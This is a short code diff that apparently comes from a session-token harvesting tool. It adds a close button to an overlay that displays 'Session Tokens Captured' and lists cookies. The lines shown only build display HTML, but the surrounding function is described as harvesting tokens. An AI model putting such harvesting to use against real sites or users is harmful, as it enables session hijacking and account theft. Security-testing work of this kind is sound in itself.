@@ -142,7 +142,7 @@ export async function harvestAndDisplayTokens(options = {}) {
         'font-family:monospace;font-size:11px;padding:12px;border-radius:6px;max-width:480px;max-height:400px;' +
         'overflow-y:auto;white-space:pre-wrap;word-break:break-all;';
 
-    let html = '<strong style="color:#f0f;">[SESSION] Session Tokens Captured</strong><br><hr>';
+    let html = '<button onclick="this.parentNode.remove()" style="position:absolute;top:4px;right:6px;background:none;border:none;color:#0f0;font-size:16px;cursor:pointer;">&times;</button><strong style="color:#f0f;">[SESSION] Session Tokens Captured</strong><br><hr>';
 
     // Cookies
     html += '<strong>[COOKIE] Cookies:</strong><br>';
